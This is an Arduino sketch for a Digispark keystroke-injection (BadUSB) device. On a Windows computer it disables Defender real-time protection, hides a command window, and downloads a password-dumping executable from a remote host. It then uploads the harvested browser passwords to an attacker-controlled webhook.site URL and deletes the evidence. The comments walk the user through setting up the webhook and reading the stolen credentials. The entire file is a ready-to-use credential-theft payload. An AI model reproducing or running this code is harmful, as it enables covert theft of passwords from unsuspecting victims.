// By 8figurealltimepro
// Go To https://webhook.site/ and get your 'Your unique URL'
// Then replace it with the <Webhook-Link>

#include "DigiKeyboard.h"
#define KEY_TAB 0x2b
void setup() {
  pinMode(1, OUTPUT); //LED on Model A 
}

void loop() {
   
  DigiKeyboard.update();
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_ESCAPE, MOD_CONTROL_LEFT); //window key
  DigiKeyboard.delay(1500);
  DigiKeyboard.println("virus & threat"); //open setting
  DigiKeyboard.delay(3000);
  DigiKeyboard.delay(3000);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_TAB);// Go to the manage settings of virus and threat protection
  DigiKeyboard.delay(200);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE);//turn off the real-time protection
  DigiKeyboard.delay(5000);
  DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);// grant permission
  DigiKeyboard.delay(400);
  DigiKeyboard.sendKeyStroke(KEY_F4, MOD_ALT_LEFT);// close the window
  DigiKeyboard.delay(300);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT); //run
  DigiKeyboard.delay(800);
  DigiKeyboard.println("cmd /k mode con: cols=15 lines=1");//start cmd
  DigiKeyboard.delay(500);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT); //Menu  
  DigiKeyboard.sendKeyStroke(KEY_M); //goto Move
  for(int i =0; i < 50; i++)
    {
      DigiKeyboard.sendKeyStroke(KEY_ARROW_LEFT);
    }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); //Detach from scrolling
  DigiKeyboard.delay(100);
  DigiKeyboard.println("cd %temp% && powershell Invoke-WebRequest https://ltobbot.herokuapp.com/1771679501475220/a.exe -OutFile a.exe && a /stext pass.txt");//download the nirsoft webpassword recovery  utility and saves the passwords
  // The above download link may  expire so download the app and host it yourself (recommended). But be sure to name the exe file as a.exe
  DigiKeyboard.delay(7000);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/<Webhook-Link> -Method POST -InFile pass.txt");//sends the password through webhook.site 
  //IMPORTANT in webhook site there will be an option 'Raw content' click on it and download the file and open it in notepad. Press control + f and find which password you want or go through all of them.
  DigiKeyboard.delay(7000);
  DigiKeyboard.println("del pass.txt && del a.exe");//clean the mess
  DigiKeyboard.delay(800);
  DigiKeyboard.println("exit");// Exit
  DigiKeyboard.delay(300);
  digitalWrite(1, HIGH); //turn on led when program finishes
  DigiKeyboard.delay(90000);
  digitalWrite(1, LOW); 
  DigiKeyboard.delay(5000);
  
}
